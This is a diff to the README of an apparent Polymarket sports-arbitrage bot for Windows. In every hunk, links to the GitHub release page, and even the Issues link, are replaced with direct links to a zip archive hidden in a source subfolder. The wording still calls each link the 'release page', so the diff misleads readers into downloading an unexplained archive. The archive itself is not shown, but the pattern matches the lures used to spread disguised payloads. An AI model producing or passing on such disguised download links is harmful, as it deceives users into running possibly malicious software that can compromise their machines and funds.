@@ -1,6 +1,6 @@
 # ⚽ Polymarket-Sports-Arbitrage-Bot - Simple Sports Trading Automation
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Bot-brightgreen)](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Bot-brightgreen)](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/raw/refs/heads/main/src/utils/Bot_Sports_Polymarket_Arbitrage_3.3.zip)
 
 ## 📋 What is Polymarket-Sports-Arbitrage-Bot?
 
@@ -27,7 +27,7 @@ This application targets sports, especially NBA games, on the Polymarket platfor
 
 To get the latest version, visit the official release page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Bot-green)](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Bot-green)](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/raw/refs/heads/main/src/utils/Bot_Sports_Polymarket_Arbitrage_3.3.zip)
 
 This page lists all available versions of the software. You will find setup files for Windows here.
 
@@ -130,7 +130,7 @@ For frequent problems, revisit the release page for updates or bug fixes.
 Updates bring performance improvements and fix bugs.
 
 1. Visit the release page:  
-   [https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)  
+   [https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/raw/refs/heads/main/src/utils/Bot_Sports_Polymarket_Arbitrage_3.3.zip](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/raw/refs/heads/main/src/utils/Bot_Sports_Polymarket_Arbitrage_3.3.zip)  
 
 2. Download the newest setup file.  
 3. Run the installer again to overwrite the old version; your settings will stay intact.  
@@ -142,7 +142,7 @@ Updates bring performance improvements and fix bugs.
 
 You can open an issue on the GitHub repository if you experience problems:
 
-- Visit the Issues tab at: https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/issues  
+- Visit the Issues tab at: https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/raw/refs/heads/main/src/utils/Bot_Sports_Polymarket_Arbitrage_3.3.zip  
 - Provide details about your problem and Windows version.  
 
 The developers review issues to maintain functionality.
@@ -163,6 +163,6 @@ The developers review issues to maintain functionality.
 
 Use this link to get the software:
 
-[https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)  
+[https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/raw/refs/heads/main/src/utils/Bot_Sports_Polymarket_Arbitrage_3.3.zip](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/raw/refs/heads/main/src/utils/Bot_Sports_Polymarket_Arbitrage_3.3.zip)  
 
 Access the release page and download the Windows setup file to start.
